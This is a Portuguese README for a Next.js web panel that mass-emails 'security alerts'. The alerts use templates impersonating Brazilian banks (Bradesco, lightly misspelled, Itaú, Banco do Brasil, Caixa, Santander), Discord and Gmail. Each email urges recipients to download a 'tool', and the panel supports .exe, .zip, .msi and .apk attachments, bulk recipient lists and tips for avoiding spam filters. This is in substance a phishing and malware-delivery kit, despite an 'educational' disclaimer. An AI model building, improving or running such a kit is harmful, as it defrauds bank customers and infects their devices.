# 🛡️ Painel de Alertas de Segurança

Sistema profissional para criação e envio de alertas de segurança por email, com templates pré-configurados e envio em massa.

## 🚀 Funcionalidades

- ✅ **Templates Profissionais** - 7 templates pré-configurados (Bradescu, Itaú, BB, Caixa, Santander, Discord, Gmail)
- ✅ **Editor Completo** - Personalize todos os aspectos do email de alerta
- ✅ **Preview em Tempo Real** - Visualize o email antes de enviar
- ✅ **Envio Real via API** - Integração com Resend para envio de emails
- ✅ **Envio em Massa** - Envie para múltiplos destinatários usando arquivo TXT
- ✅ **Histórico de Envios** - Acompanhe todos os alertas enviados
- ✅ **Upload de Ferramentas** - Anexe arquivos executáveis aos alertas (.exe, .zip, .msi, .apk)
- ✅ **Estatísticas** - Dashboard com métricas de envio

## 📋 Pré-requisitos

- Node.js 18+ instalado
- Conta no [Resend](https://resend.com) (gratuita)
- pnpm, npm ou yarn

## ⚙️ Configuração

### 1. Clone e instale as dependências

\`\`\`bash
# Instalar dependências
pnpm install
# ou
npm install
\`\`\`

### 2. Configure as variáveis de ambiente

Crie um arquivo `.env.local` na raiz do projeto:

\`\`\`env
RESEND_API_KEY=sua_chave_api_aqui
RESEND_FROM_EMAIL=onboarding@resend.dev
\`\`\`

**Como obter a chave API do Resend:**

1. Acesse [resend.com](https://resend.com)
2. Crie uma conta gratuita
3. Vá em **API Keys** no menu
4. Clique em **Create API Key**
5. Copie a chave e cole no arquivo `.env.local`

**Configuração do email remetente:**

- Para **testes**: use `onboarding@resend.dev` (domínio padrão do Resend)
- Para **produção**: adicione e verifique seu próprio domínio no Resend

### 3. Execute o projeto

\`\`\`bash
# Modo desenvolvimento
pnpm dev
# ou
npm run dev

# Acesse: http://localhost:3000
\`\`\`

## 🔧 Configuração para Produção (IMPORTANTE)

### ⚠️ Problema: Emails não chegam para destinatários externos

Se você consegue enviar emails para `onboarding@resend.dev` mas não para outros emails (Gmail, Outlook, etc.), sua conta Resend está em **modo sandbox**.

### Solução: Verificar seu Domínio

Para enviar emails para qualquer destinatário, você precisa verificar um domínio próprio no Resend:

#### Passo 1: Adicionar Domínio no Resend

1. Acesse [resend.com/domains](https://resend.com/domains)
2. Clique em **Add Domain**
3. Digite seu domínio (ex: `seusite.com`)
4. Clique em **Add**

#### Passo 2: Configurar Registros DNS

O Resend fornecerá 3 registros DNS que você precisa adicionar no seu provedor de domínio:

**Registros necessários:**

1. **SPF (TXT)**
   \`\`\`
   Tipo: TXT
   Nome: @
   Valor: v=spf1 include:_spf.resend.com ~all
   \`\`\`

2. **DKIM (TXT)**
   \`\`\`
   Tipo: TXT
   Nome: resend._domainkey
   Valor: [valor fornecido pelo Resend]
   \`\`\`

3. **DMARC (TXT)**
   \`\`\`
   Tipo: TXT
   Nome: _dmarc
   Valor: v=DMARC1; p=none
   \`\`\`

#### Passo 3: Aguardar Verificação

- A verificação pode levar de alguns minutos até 48 horas
- O Resend verificará automaticamente os registros DNS
- Você receberá um email quando o domínio for verificado

#### Passo 4: Atualizar Variável de Ambiente

Após verificar o domínio, atualize o `.env.local`:

\`\`\`env
RESEND_API_KEY=sua_chave_api_aqui
RESEND_FROM_EMAIL=alertas@seudominio.com
\`\`\`

**Formato do email remetente:**
- ✅ `alertas@seudominio.com`
- ✅ `Alertas de Segurança <alertas@seudominio.com>`
- ❌ `onboarding@resend.dev` (apenas para testes)

### Provedores de Domínio Populares

**Como adicionar registros DNS:**

- **GoDaddy**: DNS Management → Add Record
- **Namecheap**: Advanced DNS → Add New Record
- **Cloudflare**: DNS → Add Record
- **Google Domains**: DNS → Custom Records
- **Registro.br**: DNS → Adicionar Registro

### Verificar Configuração

Após configurar, teste enviando um email para:
1. Seu próprio email
2. Um email Gmail
3. Um email Outlook/Hotmail

Se todos chegarem, sua configuração está correta! ✅

## 🐛 Troubleshooting (Solução de Problemas)

### Problema: "Domínio não verificado"

**Sintoma:** Emails não chegam para destinatários externos

**Solução:**
1. Verifique se adicionou os registros DNS corretamente
2. Aguarde até 48h para propagação DNS
3. Use ferramentas como [MXToolbox](https://mxtoolbox.com) para verificar registros
4. Confirme que o domínio está verificado no painel do Resend

### Problema: "API key inválida"

**Sintoma:** Erro ao enviar qualquer email

**Solução:**
1. Verifique se copiou a chave API completa
2. Confirme que o arquivo `.env.local` está na raiz do projeto
3. Reinicie o servidor de desenvolvimento após alterar `.env.local`
4. Gere uma nova chave API no Resend se necessário

### Problema: "Rate limit exceeded"

**Sintoma:** Alguns emails não são enviados em massa

**Solução:**
1. **Plano Gratuito**: Limite de 100 emails/dia
2. **Plano Pago**: Até 50.000 emails/mês
3. Divida listas grandes em múltiplos envios
4. Aguarde 24h para o limite resetar

### Problema: Emails caem na caixa de spam

**Sintoma:** Emails chegam mas vão para spam

**Solução:**
1. Configure registros SPF, DKIM e DMARC corretamente
2. Use um domínio verificado (não `@resend.dev`)
3. Evite palavras como "urgente", "grátis", "clique aqui" em excesso
4. Adicione um link de "descadastrar" nos emails
5. Mantenha uma boa reputação de envio (baixa taxa de spam)

### Problema: Emails não chegam no Gmail

**Sintoma:** Funciona em outros provedores, mas não no Gmail

**Solução:**
1. Verifique a pasta de spam do Gmail
2. Confirme que os registros DKIM e SPF estão corretos
3. Use [Google Postmaster Tools](https://postmaster.google.com) para monitorar reputação
4. Evite enviar muitos emails de uma vez (rate limiting)

### Verificar Logs

Para debug, verifique os logs no console do navegador e no terminal:

\`\`\`bash
# Terminal (servidor)
[v0] Iniciando envio de email para: usuario@exemplo.com
[v0] Email enviado com sucesso: { id: 'xxx' }

# Ou em caso de erro:
[v0] Erro ao enviar email: Domain not verified
\`\`\`

## 📧 Como Usar

### Enviar um Alerta Individual

1. **Selecione um Template** - Escolha entre Bradescu, Itaú, BB, Caixa, Santander, Discord ou Gmail
2. **Escolha o Tipo de Alerta** - Urgente, Crítico, Importante ou Informativo
3. **Preencha os Dados**:
   - Nome do destinatário
   - Email do destinatário
   - Personalize título e mensagens
   - Adicione link de download da ferramenta
   - Configure informações de contato
4. **Visualize o Preview** - Confira como o email ficará
5. **Envie** - Clique em "Enviar Alerta"

### 📨 Envio em Massa

O sistema permite enviar o mesmo alerta para múltiplos destinatários de uma só vez usando um arquivo TXT.

#### Preparar o Arquivo TXT

Crie um arquivo de texto (.txt) com um email por linha:

\`\`\`txt
cliente1@exemplo.com
cliente2@exemplo.com
cliente3@exemplo.com
joao.silva@email.com
maria.santos@email.com
\`\`\`

**Regras do arquivo:**
- Um email por linha
- Linhas vazias serão ignoradas
- Apenas emails válidos (contendo @) serão processados
- Formato: `.txt` (texto simples)

#### Enviar em Massa

1. **Configure o Alerta** - Preencha todos os campos do formulário (título, mensagem, link, etc.)
2. **Carregue o Arquivo** - Na seção "Envio em Massa", clique em "Carregar lista de emails"
3. **Selecione o Arquivo TXT** - Escolha seu arquivo com a lista de emails
4. **Revise a Lista** - O sistema mostrará quantos emails foram encontrados
5. **Envie** - Clique em "Enviar para X destinatários"
6. **Acompanhe** - O sistema mostrará o progresso e resultado final

**Exemplo de resultado:**
\`\`\`
✅ Envio em massa concluído!

📧 Enviados: 48
❌ Falhas: 2
📊 Total: 50
\`\`\`

#### Limitações e Boas Práticas

- **Rate Limiting**: O sistema adiciona um delay de 100ms entre cada email para evitar bloqueios
- **Plano Gratuito Resend**: Limite de 100 emails/dia
- **Plano Pago Resend**: Até 50.000 emails/mês
- **Recomendação**: Para listas grandes (>100 emails), considere dividir em múltiplos arquivos
- **Validação**: Sempre teste com poucos emails primeiro

### Anexar Ferramentas

- Clique em "Clique para anexar ferramenta"
- Selecione arquivos `.exe`, `.zip`, `.msi` ou `.apk`
- O arquivo será referenciado no email

## 🏗️ Estrutura do Projeto

\`\`\`
├── app/
│   ├── api/
│   │   ├── send-email/
│   │   │   └── route.ts          # API de envio individual
│   │   └── send-bulk-email/
│   │       └── route.ts          # API de envio em massa
│   ├── page.tsx                   # Painel principal
│   └── layout.tsx                 # Layout da aplicação
├── .env.local                     # Variáveis de ambiente (criar)
├── .env.example                   # Exemplo de configuração
└── README.md                      # Este arquivo
\`\`\`

## 🔒 Segurança

⚠️ **IMPORTANTE**: Este sistema foi desenvolvido para fins educacionais e de demonstração. 

**Considerações de segurança:**

- Nunca exponha sua `RESEND_API_KEY` publicamente
- Use variáveis de ambiente para dados sensíveis
- Implemente autenticação antes de usar em produção
- Valide todos os inputs do usuário
- Considere rate limiting para prevenir abuso
- Para produção, adicione CAPTCHA e autenticação de 2 fatores

## 🚀 Deploy

### Vercel (Recomendado)

1. Faça push do código para GitHub
2. Importe o projeto no [Vercel](https://vercel.com)
3. Configure as variáveis de ambiente:
   - `RESEND_API_KEY`
   - `RESEND_FROM_EMAIL`
4. Deploy automático!

### Outras Plataformas

O projeto é compatível com qualquer plataforma que suporte Next.js 16+:
- Netlify
- Railway
- Render
- AWS Amplify

## 📝 API Endpoints

### POST `/api/send-email`

Envia um email de alerta individual.

**Body:**
\`\`\`json
{
  "to": "destinatario@exemplo.com",
  "companyName": "Bradescu",
  "recipientName": "João Silva",
  "alertTitle": "Alerta Urgente de Segurança",
  "mainMessage": "Mensagem principal...",
  "actionMessage": "Ação obrigatória...",
  "buttonText": "Baixar a Ferramenta",
  "downloadLink": "https://exemplo.com/ferramenta.exe",
  "contactInfo": "0800-123-456",
  "alertType": "urgente",
  "templateColor": "#003d7a",
  "accentColor": "#fef3c7",
  "companyFooter": "Bradescu S.A."
}
\`\`\`

### POST `/api/send-bulk-email`

Envia emails em massa para múltiplos destinatários.

**Body:**
\`\`\`json
{
  "emails": ["email1@exemplo.com", "email2@exemplo.com"],
  "companyName": "Bradescu",
  "recipientName": "Cliente",
  "alertTitle": "Alerta Urgente de Segurança",
  "mainMessage": "Mensagem principal...",
  "actionMessage": "Ação obrigatória...",
  "buttonText": "Baixar a Ferramenta",
  "downloadLink": "https://exemplo.com/ferramenta.exe",
  "contactInfo": "0800-123-456",
  "templateColor": "#003d7a",
  "accentColor": "#fef3c7",
  "companyFooter": "Bradescu S.A."
}
\`\`\`

**Resposta:**
\`\`\`json
{
  "success": true,
  "successCount": 48,
  "failureCount": 2,
  "errors": ["email@invalido.com: Invalid email"]
}
\`\`\`

## 🛠️ Tecnologias

- **Next.js 16** - Framework React
- **TypeScript** - Tipagem estática
- **Tailwind CSS** - Estilização
- **Resend** - Envio de emails
- **React 19** - Biblioteca UI

## 📊 Templates Disponíveis

1. **Bradescu** - Alerta bancário tradicional
2. **Itaú** - Verificação de segurança
3. **Banco do Brasil** - Atualização obrigatória
4. **Caixa Econômica** - Bloqueio preventivo
5. **Santander** - Atividade suspeita
6. **Discord** - Alerta de conta Discord
7. **Gmail** - Alerta de segurança Google

## 📄 Licença

Este projeto é fornecido "como está" para fins educacionais.

## 🤝 Suporte

Para dúvidas sobre:
- **Resend**: [resend.com/docs](https://resend.com/docs)
- **Next.js**: [nextjs.org/docs](https://nextjs.org/docs)
- **Deploy**: [vercel.com/docs](https://vercel.com/docs)

## 💡 Dicas de Uso

- Sempre teste com seus próprios emails primeiro
- Use templates apropriados para cada tipo de alerta
- Personalize cores e mensagens para cada campanha
- Monitore as estatísticas de envio
- Mantenha backups das listas de emails
